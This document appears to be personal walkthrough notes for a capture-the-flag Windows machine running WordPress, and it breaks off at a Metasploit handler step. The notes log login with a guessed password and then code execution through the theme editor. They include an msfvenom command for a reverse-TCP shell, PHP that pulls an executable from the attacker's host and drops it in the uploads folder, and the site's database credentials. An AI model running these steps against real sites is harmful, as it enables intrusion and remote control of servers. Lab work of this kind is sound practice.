1. Did default scans.
2. Found WordPress website on /retro/
3. Only poster is user named "wade", found random comment says "If i forget to spell it, with `parzival`". This turned out to be the password.
4. Since we're now in WordPress with access, we can make a reverse shell from a WP Theme  as we've done before.
5. We use c99-webshell.php to spawn a Full PHP webshell. Unfortunately this is a windows machine.

http://10.10.136.72/retro/wp-admin/theme-editor.php -> Single Page adjustment:

http://10.10.249.174/retro/wp-admin/theme-editor.php?file=page.php&theme=90s-retro


file_put_content -> file_get_content into wp-content/uploads/

Found some WordPress config for the SQL database:

      // ** MySQL settings - You can get this info from your web host ** //
      /** The name of the database for WordPress */
      define('DB_NAME', 'wordpress567');

      /** MySQL database username */
      define('DB_USER', 'wordpressuser567');

      /** MySQL database password */
      define('DB_PASSWORD', 'YSPgW[%C.mQE');

      /** MySQL hostname */
      define('DB_HOST', 'localhost');

      /** Database Charset to use in creating database tables. */
      define('DB_CHARSET', 'utf8');

      /** The Database Collate type. Don't change this if in doubt. */
      define('DB_COLLATE', '');


Tried making a reverse shell executeable in msfvenom:
`msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`

And upload it by using file_put_concents from PHP In the WP-Admin.

Setup Python HTTP server to serve Reverse shell EXE.

Simple PHP code to Exploit and download stuff:

```
<?php

$url = 'http://10.14.12.121:8000/rshell-3.exe';

var_dump(file_put_contents("C:\\inetpub\\wwwroot\\retro\\wp-content\\uploads\\2022\\09\\rshell-3.exe", file_get_contents($url)));

//echo system("cd ./wp-content/uploads/2022/09/ & dir & start rshell-3.exe");


exit;


?>
```

MSFConsole connection works; but not sure where to go from there.

Tried to upload WinPEASx86 and found a few vulnerabilites i might be able to exploit.

For MSFConsole use:

```
use multi/handler for Callback. 